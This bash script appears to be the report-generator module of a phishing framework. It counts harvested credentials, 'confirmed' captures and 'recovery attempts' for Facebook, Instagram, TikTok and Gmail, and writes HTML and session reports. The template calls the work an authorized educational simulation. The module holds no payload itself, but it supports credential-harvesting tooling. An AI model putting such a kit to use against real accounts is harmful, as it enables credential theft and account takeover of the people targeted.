#!/bin/bash

# ============================================
# REPORT GENERATOR MODULE
# ============================================

generate_full_report() {
    clear
    echo -e "${COLORS[BANNER]}${COLORS[BOLD]}"
    cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║                   REPORT GENERATOR                            ║
╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${COLORS[RESET]}"
    
    local report_file="$LOGS_DIR/reports/full_report_$(date +%Y%m%d_%H%M%S).html"
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Phishing Simulation Report</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
        .header { border-bottom: 2px solid #00ff00; margin-bottom: 20px; }
        .section { background: #2a2a2a; padding: 15px; border-radius: 5px; margin: 15px 0; }
        .stat { color: #00ffff; }
        h1, h2 { color: #00ff00; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #444; }
        .footer { margin-top: 30px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Advanced Phishing Simulation Report</h1>
        <p>Generated: $(date)</p>
    </div>
    
    <div class="section">
        <h2>Executive Summary</h2>
        <p>This report contains the results of an authorized phishing simulation conducted for educational purposes.</p>
    </div>
    
    <div class="section">
        <h2>Capture Statistics</h2>
        <table>
            <tr>
                <th>Platform</th>
                <th>Total Captures</th>
                <th>Confirmed</th>
                <th>Recovery Attempts</th>
            </tr>
EOF

    for platform in FB INS TK GML; do
        case $platform in
            FB) platform_name="Facebook";;
            INS) platform_name="Instagram";;
            TK) platform_name="TikTok";;
            GML) platform_name="Gmail";;
        esac
        
        txt_count=$(find "$CAPTURES_DIR/$platform" -name "*.txt" 2>/dev/null | wc -l)
        confirmed_count=$(grep -c "✅ CONFIRMED" "$CAPTURES_DIR/$platform/CONFIRMED_SUMMARY.txt" 2>/dev/null || echo "0")
        recovery_count=$(sqlite3 "$CAPTURES_DIR/$platform/${platform}_recovery.db" "SELECT COUNT(*) FROM recovery_data;" 2>/dev/null || echo "0")
        
        cat >> "$report_file" << EOF
            <tr>
                <td>$platform_name</td>
                <td>$txt_count</td>
                <td>$confirmed_count</td>
                <td>$recovery_count</td>
            </tr>
EOF
    done
    
    cat >> "$report_file" << EOF
        </table>
    </div>
    
    <div class="footer">
        <p>Advanced Phishing Simulation Framework v$VERSION</p>
        <p>This report is for educational purposes only.</p>
    </div>
</body>
</html>
EOF
    
    echo -e "${COLORS[SUCCESS]}[✓] Report generated: $report_file${COLORS[RESET]}"
    
    if command -v xdg-open &> /dev/null; then
        xdg-open "$report_file" 2>/dev/null &
    fi
    
    read -p "Press ENTER to continue..."
}

generate_session_report() {
    local report_file="$LOGS_DIR/reports/session_$(date +%Y%m%d_%H%M%S).txt"
    
    {
        echo "=========================================="
        echo "SESSION REPORT - $(date)"
        echo "=========================================="
        echo "Platform: $TARGET_SITE"
        echo "Mode: $DEPLOYMENT_MODE"
        echo "Port: $SELECTED_PORT"
        echo "------------------------------------------"
        echo "Captures saved to: $PLATFORM_CAPTURE_DIR"
        echo "=========================================="
    } > "$report_file"
}